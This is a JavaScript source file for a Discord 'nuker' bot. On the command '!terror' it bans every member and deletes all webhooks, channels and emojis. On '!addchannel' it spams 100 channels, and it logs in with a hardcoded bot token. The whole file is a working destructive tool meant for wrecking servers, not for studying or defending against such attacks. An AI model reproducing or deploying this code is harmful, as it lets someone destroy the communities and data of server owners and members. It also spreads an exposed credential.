const { Client } = require('discord.js')

const {
    banAllUsers,
    removeAllWebhook,
    removeChannels,
    removeEmojis
} = require('./functions')

const prefix = '!'

const client = new Client()

client.on('message', async (msg) => {
    const cmd = msg.content.replace(prefix, '')

    if (cmd === 'terror') {
        await banAllUsers(msg)
        await removeAllWebhook(msg)
        await removeChannels(msg)
        await removeEmojis(msg)
    }

    if (cmd === 'addchannel') {
        for (let i = 1; i <= 100; i++) {
            msg.guild.channels.create('channel', 'text')
        }
        console.log('done')
    }
})

client.login('NTQ0NjYzODY5MjQ3OTc5NTQw.XGIHwQ.R4c7_bM6UpUHEPZjfS3pXCzvDbI')